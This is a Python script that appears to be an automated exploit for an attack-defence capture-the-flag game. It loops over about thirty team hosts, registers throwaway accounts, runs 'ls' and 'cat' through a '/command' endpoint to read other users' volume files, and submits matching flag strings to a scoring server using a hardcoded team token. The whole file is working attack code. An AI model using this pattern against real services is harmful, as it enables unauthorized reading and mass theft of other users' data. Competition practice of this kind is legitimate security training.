import requests
import json
import random
import string
import re
import time

def login(ip, username, password):
    d = f"username={username}&password={password}"
    ind = 'http://' + ip + "/login"
    login = requests.post(ind, data = d, headers = {"Content-Type": "application/x-www-form-urlencoded"})
    return login.headers['Cookie']

def sendFlag(flags):

    TEAM_TOKEN = 'df2b4156f8b5e7e5609ac543b99d1347'
    print(requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text)

def register(ip, username, password):
    session = requests.Session()
    d = f"username={username}&password={password}"
    ind = 'http://' + ip + "/register"
    reg = session.post(ind , data = d, headers = {"Content-Type": "application/x-www-form-urlencoded"})
    return session.cookies.get_dict()['session']

def terminal(ip, sessionid, com1):
    d = {"command": com1}
    url = f"http://{ip}/command"
    h = {'Content-type': 'application/json'}
    p = requests.post(url, json = d, headers = {"Content-Type": "application/json"}, cookies = {"session":sessionid})
    return p

while True:
    ids = requests.get('http://10.10.0.1:8081/flagIds').text
    ids = json.loads(ids)
    ids = ids["CApp"]

    for i in range(1,35):
        if i != 29:
            try:
                ip = f"10.60.{i}.1"

                attack = ids[ip]
                flags = []
                username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
                password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

                cookie = register(ip, username, password)

                flags = []

                for j in attack:
                    j = json.loads(j)
                    userid = j["user_id"]
                    command = 'ls .union./volume-' + userid + '/'
                    result = terminal(ip, cookie, command).text
                    result = json.loads(result)
                    k = result['output']
                    #print(k)
                    splitted = k.strip().split(' ')
                    #print(splitted)
                    for s in splitted:
                        tomatch = terminal(ip,cookie,f"cat .union./volume-{userid}/{s}")
                        #print(tomatch.text)
                        t = json.loads(tomatch.text)
                        #print(t['output'])
                        if re.search('^[0-9A-Z]{31}=$', t['output']):
                            flags.append(t['output'])
                        #if tomatch.text
                    #print(command.text)
                #print(flags)
                sendFlag(flags)
            except Exception as e:
                print(e)
    time.sleep(40)
